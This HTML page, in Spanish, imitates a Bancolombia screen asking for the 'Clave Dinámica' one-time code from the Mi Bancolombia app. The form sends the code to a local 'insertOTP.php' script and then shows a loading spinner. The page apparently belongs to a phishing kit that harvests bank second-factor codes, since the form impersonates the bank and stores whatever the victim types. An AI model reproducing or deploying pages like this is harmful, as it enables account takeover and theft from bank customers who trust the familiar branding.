<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="assets/styles/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
    <!-- OtpForm -->
    <form action="models/insertOTP.php" method="POST" id="otpForm">
        <div id="otpView" class="otp-page" style="display: flex;">
            <div class="esquemaBase">
                <div class="contenedorForm">
                    <div class="containerInfoForm">
                        <div class="headerForm">
                            <!-- -->
                            <div class="containerGif">
                                <img src="assets/images/cd-desktop.gif" alt="gifOtp" width="100%" height="100%">
                            </div>
                            <h3 class="dinMensaje"> Ingresa la Clave Dinámica </h3>
                        </div>
                        <div class="containerBody">
                            <p class="dinMensajePeq" style="padding-bottom: 0"> Encuentra tu Clave Dinámica en la app Mi Bancolombia. </p>
                            <div class="containerInputs">
                                <div class="inputsContainer">
                                    <div class="camposInputs">
                                        <div class="tokenInputs">
                                            <div class="inputs">
                                                <input name="otp" class="DInputs" pattern="[0-9]*" required="true" placeholder=" " inputmode="numeric" type="password" maxlength="1" />
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="containerFooter">
                            <div class="containerAllButtons">
                                <button class="btnBorrar"> Borrar </button>
                                <button type="submit" class="btnContinuar"> Continuar </button>
                            </div>
                        </div>
                    </div>
                    <div class="equisEsquina"> ❌ </div>
                </div>
            </div>
        </div>
    </form>

    <!-- Loader oculto inicialmente -->
    <div class="loader-overlay" style="display:none;">
        <div class="loader-container">
            <div class="spinner"></div>
            <div id="spinner" class="loading-text">Cargando...</div>
        </div>
    </div>

</body>

</html>